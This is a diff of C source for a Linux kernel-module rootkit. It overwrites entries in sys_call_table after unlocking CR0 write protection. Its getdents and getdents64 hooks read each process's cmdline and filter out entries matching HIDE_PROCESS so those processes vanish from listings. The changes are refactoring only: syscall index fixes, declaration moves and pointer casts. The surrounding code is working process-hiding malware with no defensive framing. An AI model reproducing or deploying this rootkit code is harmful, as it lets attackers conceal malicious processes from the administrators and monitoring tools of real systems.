@@ -234,7 +234,7 @@ asmlinkage long totallyReal_getdents(unsigned int fd, struct linux_dirent * dirp
 	int nread;
 	struct linux_dirent *mod_dirp;
 
-	nread = ( ( typeof(sys_getdents)* )(original_syscallPtrs[3]) )(fd, dirp, count);
+	nread = ( ( typeof(sys_getdents)* )(original_syscallPtrs[2]) )(fd, dirp, count);
 	if (nread == -1) {
 		pr_info("FAKEGETDENTS: error calling original function \n");
 		return -1;
@@ -299,13 +299,14 @@ asmlinkage long totallyReal_getdents(unsigned int fd, struct linux_dirent * dirp
 	return nread;
 }
 
-// Equivalent to getdents bot for getdents64
+/*** Equivalent to getdents bot for getdents64 ***/
 asmlinkage long totallyReal_getdents64(int fd, struct linux_dirent64 * dirp, unsigned int count) {
-	// the out of getdents is the number of bytes read
+	// the return value of getdents is the number of bytes read
+
 	int nread;
 	struct linux_dirent64 *mod_dirp;
 
-	nread = ( ( typeof(sys_getdents64)* )(original_syscallPtrs[5]) )(fd, dirp, count);
+	nread = ( ( typeof(sys_getdents64)* )(original_syscallPtrs[3]) )(fd, dirp, count);
 	if (nread == -1) {
 		pr_info("FAKEGETDENTS: error calling original function \n");
 		return -1;
@@ -323,18 +324,18 @@ asmlinkage long totallyReal_getdents64(int fd, struct linux_dirent64 * dirp, uns
 	
 	copy_from_user( mod_dirp, dirp, nread);
 	
-	int offset = 0;
+	int i, is_proc_name_match, offset = 0;
+	unsigned short p_dirent_len;
+	char buf[BUF_SIZE], filename[128];
+	struct file *f;
 	struct linux_dirent64 *p_dirp, *prev;
 	while( offset < nread) {
 		p_dirp = (void *) mod_dirp + offset;
-		unsigned short p_dirent_len = p_dirp->d_reclen;
+		p_dirent_len = p_dirp->d_reclen;
 		
-		struct file *f;
-		char buf[BUF_SIZE];
-		int i = 0;
 		for (i = 0; i < 128; i++)
 			buf[i] = 0;
-		char filename[128];
+
 		get_cmdline_path( filename, p_dirp->d_name);
 		pr_info("FAKEGETDENTS: filename is: %s", filename);
 		f = file_open( filename, O_RDONLY, 0 );
@@ -344,7 +345,8 @@ asmlinkage long totallyReal_getdents64(int fd, struct linux_dirent64 * dirp, uns
 			file_read(f, 0, buf, BUF_SIZE - 1);
 			pr_info("FAKEGETDENTS: cmdline is %s", buf);
 		}
-		int is_proc_name_match = 0;
+
+		is_proc_name_match = 0;
 		if ( strncmp( buf, HIDE_PROCESS, 127 ) == 0 )
 			is_proc_name_match = 1;
 
@@ -365,7 +367,9 @@ asmlinkage long totallyReal_getdents64(int fd, struct linux_dirent64 * dirp, uns
 		}
 		offset += p_dirent_len;
 	}
+
 	copy_to_user(dirp, mod_dirp, nread);
+	
 	kvfree(mod_dirp);
 	return nread;
 }
@@ -385,7 +389,7 @@ void injectSyscalls(void)
 
             //inject fake ptr
             CR0_WRITE_UNLOCK({
-                sys_call_table[syscall_names[targetIndex]] = totallyReal_syscallPtrs[targetIndex];
+                sys_call_table[syscall_names[targetIndex]] = (unsigned long)totallyReal_syscallPtrs[targetIndex];
             });
             pr_info("phony ptr injected as %p\n", (void *)sys_call_table[syscall_names[targetIndex]]);
 
@@ -407,7 +411,7 @@ void restoreSyscalls(void)
         {
             pr_info("Restoring ptr for target %d\n", targetIndex);
             CR0_WRITE_UNLOCK({
-                sys_call_table[syscall_names[targetIndex]] = original_syscallPtrs[targetIndex];
+                sys_call_table[syscall_names[targetIndex]] = (unsigned long)original_syscallPtrs[targetIndex];
             });
             pr_info("Ptr restored for target %d as %p\n", targetIndex, (void *)sys_call_table[syscall_names[targetIndex]]);
         }
